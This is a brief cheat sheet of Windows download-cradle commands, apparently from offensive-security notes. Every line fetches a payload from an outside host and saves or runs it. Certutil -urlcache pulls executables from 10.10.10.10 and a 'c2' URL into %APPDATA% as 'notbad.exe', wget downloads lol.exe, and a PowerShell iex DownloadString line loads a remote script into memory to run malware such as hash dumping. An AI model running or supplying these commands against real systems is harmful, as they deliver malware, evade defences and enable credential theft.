# Command line
	cmd.exe /C certutil  -split -urlcache -f http://10.10.10.10/exe.LOL c:\Users\Admin\Desktop\exe.lol
# Utilities
	certutil -urlcache -f http://10.10.10.10/lol.exe lol.exe
	certutil -urlcache -split -f http://mywebsite.com/c2 %APPDATA%\notbad.exe
# Command Line 
	wget http://10.10.10.10/lol.exe -outfile lol.exe
# loaded into memory can then run commands from malware ie get-hash
	iex (New-Object Net.webclient).downloadstring('http://10.10.10.10/lol.ps1')
